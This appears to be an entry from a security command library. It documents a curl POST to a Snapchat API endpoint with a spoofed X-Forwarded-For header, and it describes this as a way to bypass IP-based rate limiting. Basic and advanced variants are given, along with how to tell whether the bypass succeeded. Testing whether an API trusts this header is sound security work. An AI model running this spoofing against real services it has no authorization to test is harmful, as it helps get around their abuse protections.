---
data: >-
  curl -X POST https://app.snapchat.com/stories_everywhere/download_sms -H
  "X-Forwarded-For: 127.0.0.1" -d "payload=example"
tags:
  - web
  - http
  - spoofing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:28.884Z'
id: 3b748915-e4f5-4ca8-a7b0-17b08fc38e10
verified: false
validated: true
submitted: true
---
# curl-post-with-x-forwarded-for

## Command

```bash
curl -X POST https://app.snapchat.com/stories_everywhere/download_sms \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d "payload=example"
```

## Description

This command uses curl to send a POST request to a Snapchat API endpoint with a spoofed X-Forwarded-For header set to 127.0.0.1, bypassing IP-based rate limiting. Use it to test for header trust issues in web APIs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://app.snapchat.com/stories_everywhere/download_sms` | Target API endpoint URL | Yes |
| `-H "X-Forwarded-For: 127.0.0.1"` | Sets the spoofed IP header to localhost | Yes |
| `-d "payload=example"` | POST body data (adjust based on endpoint requirements) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://app.snapchat.com/stories_everywhere/download_sms \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d "payload=example"
```

### Advanced Usage

```bash
curl -X POST https://app.snapchat.com/stories_everywhere/download_sms \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "key1=value1&key2=value2" \
  -v
```

## Expected Output

A successful HTTP 200 response with API data (e.g., JSON), such as {"status":"success"}. No rate limit errors (e.g., 429) indicate bypass success.

## Related

- [[Related Procedure: Spoof-X-Forwarded-For-to-Bypass-Rate-Limiting]]
